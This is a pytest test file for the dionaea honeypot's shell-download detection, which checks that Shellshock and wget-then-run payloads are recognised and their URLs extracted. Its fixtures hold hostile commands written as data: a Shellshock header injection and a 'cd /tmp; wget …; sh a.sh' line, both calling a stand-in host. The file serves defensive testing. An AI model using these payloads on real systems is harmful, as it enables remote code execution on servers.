# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""dionaea/util.py: shell download detection on bytes (header values, SOAP tags).

util.py imports dionaea.core only inside the functions; a stand-in module
makes that import work without the binding.
"""

import importlib.util
import os
import sys
import types
from pathlib import Path

import pytest


class FakeIncident:
    reported = []

    def __init__(self, name):
        self.name = name

    def report(self):
        FakeIncident.reported.append((self.name, self.url))


def _load():
    root = Path(os.environ["DIONAEA_PY_SRC"]) if os.environ.get("DIONAEA_PY_SRC") else (
        Path(__file__).resolve().parents[3] / "modules" / "python" / "dionaea")
    spec = importlib.util.spec_from_file_location("dionaea_util_under_test", root / "util.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def util(monkeypatch):
    core = types.ModuleType("dionaea.core")
    core.incident = FakeIncident
    monkeypatch.setitem(sys.modules, "dionaea", types.ModuleType("dionaea"))
    monkeypatch.setitem(sys.modules, "dionaea.core", core)
    FakeIncident.reported = []
    return _load()


SHELLSHOCK = b"() { :;}; /bin/bash -c 'wget http://203.0.113.5:8080/x.sh -O /tmp/x'"


@pytest.mark.parametrize("data", [SHELLSHOCK, SHELLSHOCK.decode()])
def test_detect_shellshock_finds_the_url(util, data):
    assert util.detect_shellshock(object(), data) == ["http://203.0.113.5:8080/x.sh"]
    assert FakeIncident.reported == [("dionaea.download.offer", "http://203.0.113.5:8080/x.sh")]


def test_detect_shellshock_ignores_other_data(util):
    assert util.detect_shellshock(object(), b"Mozilla/5.0 wget http://203.0.113.5/x") is None
    assert FakeIncident.reported == []


@pytest.mark.parametrize("data", [
    b"cd /tmp; wget http://203.0.113.5/a.sh; sh a.sh", "cd /tmp; wget http://203.0.113.5/a.sh; sh a.sh",
])
def test_find_shell_download_takes_bytes_and_str(util, data):
    assert util.find_shell_download(object(), data, report_incidents=False) == ["http://203.0.113.5/a.sh"]
